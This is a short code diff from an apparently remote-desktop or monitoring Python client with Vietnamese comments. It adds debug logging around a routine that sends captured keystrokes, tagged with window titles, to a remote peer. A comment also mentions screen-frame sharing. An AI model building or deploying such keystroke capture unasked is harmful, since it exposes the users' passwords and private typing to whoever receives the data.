@@ -326,16 +326,16 @@ class Client:
                 "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
             
+            # Debug log
+            print(f"[Keylog] 📝 Gửi: '{key_data[:20]}...' @ {window_title}")
+            
             # Gửi qua INPUT channel (như input PDU)
             # Format: pdu with type='input' và input_data=keylog_data
             self.network.send_input_pdu(keylog_data)
             
-            # Log local (optional)
-            # self.logger(f"[Keylog] {key_data} @ {window_title}")
-            
         except Exception as e:
-            # Không log lỗi để tránh spam
-            pass
+            # Log lỗi để debug
+            print(f"[Keylog] ❌ Lỗi gửi keylog: {e}")
 
     def _on_frame(self, width, height, jpg_bytes, bbox, img, seq, ts_ms):
         # Tất cả các role đều được phép gửi frame (screen sharing)
